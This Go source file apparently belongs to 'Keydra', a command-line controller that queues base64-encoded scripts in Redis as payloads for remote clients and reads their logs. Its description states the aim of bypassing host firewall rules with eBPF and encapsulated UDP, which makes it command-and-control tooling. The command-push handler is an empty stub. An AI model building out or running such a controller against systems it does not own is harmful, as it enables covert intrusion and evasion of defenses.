package main

import (
	"context"
	b64 "encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/redis/go-redis/v9"
	"github.com/spf13/cobra"
)

// Types
type PayloadScript struct {
	FilePath    string `json:"file_path"`
	EncodedData string `json:"encoded_data"`
}

var (
	rdb *redis.Client
	ctx = context.Background()
)

// user id (Just random right now..)
var UserId = 1

// Root command
var rootCmd = &cobra.Command{
	Use:   "keydra",
	Short: "Handles the Keydra server",
	Long: `Keydra is a control server for clients communicated with over raw socket UDP.

The goal is to bypass host level firewall rules through the use of eBPF and encapsulated UDP packets.`,
	PersistentPreRun: connectToServerRDB,
}

// Log commands
var payloadCmd = &cobra.Command{
	Use:   "payload",
	Short: "Operations for Keydra payloads",
}

var payloadPushSubCmd = &cobra.Command{
	Use:   "push",
	Short: "Operations for pushing to Keydra command payload",
}

var pushPayloadCommandSubCmd = &cobra.Command{
	Use:   "command [command]",
	Short: "Push a command onto the payload",
	Long:  "Pushes a command onto the Keydra command payload in Redis.",
	Args:  cobra.ExactArgs(1),
	// Run:   pushPayload,
}

var pushPayloadScriptSubCmd = &cobra.Command{
	Use:   "script [filepath]",
	Short: "Push a script onto the payload",
	Long:  "Pushes a script onto the Keydra command payload in Redis.",
	Args:  cobra.ExactArgs(1),
	Run:   pushPayloadScript,
}

// Log commands
var logCmd = &cobra.Command{
	Use:   "log",
	Short: "Operations for Keydra logs",
}

var readLogCmd = &cobra.Command{
	Use:   "read",
	Short: "Read from database",
	Long:  "Read operations for the keydra cli for logs",
}

var readLogChannelCmd = &cobra.Command{
	Use:   "channel [channel] [n]",
	Short: "Read a log channel",
	Long:  "Reads the last N messages from a given Redis log channel (stream).",
	Args:  cobra.ExactArgs(2),
	Run:   readLogChannelFunc,
}

// Helper function
func getFileNameFromString(fileName string) (result string) {
	return fileName[strings.LastIndex(fileName, "/")+1:] // Returns either everything after the final /, or, the whole string
}

// Push a command onto the payload
func pushPayloadScript(cmd *cobra.Command, args []string) {
	filePath := args[0]

	// Check if file exists, if not open vim to create it
	if _, err := os.Stat(filePath); errors.Is(err, os.ErrNotExist) {
		filePath = fmt.Sprintf("/tmp/%s", filePath)
		vimCmd := exec.Command("vim", filePath)
		vimCmd.Stdin = os.Stdin
		vimCmd.Stdout = os.Stdout
		vimCmd.Stderr = os.Stderr

		err := vimCmd.Run()
		if err != nil {
			fmt.Printf("Error running vim: %v\n", err)
			return
		}
	}

	// Get file name

	// Grab data from file
	fileContent, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("Error reading file: %v\n", err)
	}

	// Encode string to b64 and put it i
	scriptStruct := PayloadScript{
		FilePath:    filePath,
		EncodedData: b64.StdEncoding.EncodeToString(fileContent),
	}

	// Marshal data to JSON and push to rdb
	marshaledData, err := json.Marshal(scriptStruct)
	if err != nil {
		fmt.Printf("Error marshaling data: %v\n", err)
	}

	// I chose a hash because I want to be able to assign data to the user, including scripts, keybinds, etc without having a stack that was pushed or popped from
	hashTable := fmt.Sprintf("user:%02d", UserId)
	fieldName := fmt.Sprintf("script:%s", getFileNameFromString(filePath))

	rdb.HSet(context.Background(), hashTable, fieldName, marshaledData) // If someone pushes an overlapping script, this will over write the value
}

// Push a script onto the payload
func pushPayloadCommandFunc(cmd *cobra.Command, args []string) {

}

// Connect to Redis before running commands
func connectToServerRDB(cmd *cobra.Command, args []string) {
	rdb = redis.NewClient(&redis.Options{
		Addr: "localhost:6379", // adjust if Redis is remote
	})
}

// Reads and prints logs
func readLogChannelFunc(cmd *cobra.Command, args []string) {
	channel := args[0]
	nStr := args[1]

	n, err := strconv.ParseInt(nStr, 10, 64)
	if err != nil {
		fmt.Printf("Invalid number '%s': %v\n", nStr, err)
		os.Exit(1)
	}

	vals, err := rdb.XRevRangeN(ctx, channel, "+", "-", n).Result()
	if err != nil {
		fmt.Printf("Failed to read log channel '%s': %v\n", channel, err)
		os.Exit(1)
	}

	fmt.Printf("%-10s %-10s %-40s\n", "TIME", "EVENT", "MESSAGE")
	for i := len(vals) - 1; i >= 0; i-- { // reverse to print oldest first
		entry := vals[i]
		timeStr, _ := entry.Values["time"].(string)
		eventStr, _ := entry.Values["event"].(string)
		msgStr, _ := entry.Values["message"].(string)

		fmt.Printf("%-10s %-10s %-40s\n", timeStr, eventStr, msgStr)
	}
}

func init() {
	// Log Commands
	readLogCmd.AddCommand(readLogChannelCmd)
	logCmd.AddCommand(readLogCmd)

	// Push Payload Commands
	pushPayloadScriptSubCmd.Flags().Bool("save", false, "Save script (if a new one is created)")
	payloadPushSubCmd.AddCommand(pushPayloadCommandSubCmd)
	payloadPushSubCmd.AddCommand(pushPayloadScriptSubCmd)

	// Payload Root Commands
	payloadCmd.AddCommand(payloadPushSubCmd)

	// Root Commands
	rootCmd.AddCommand(payloadCmd)
	rootCmd.AddCommand(logCmd)
}

func main() {
	defer os.RemoveAll(".keydra/tmp")
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
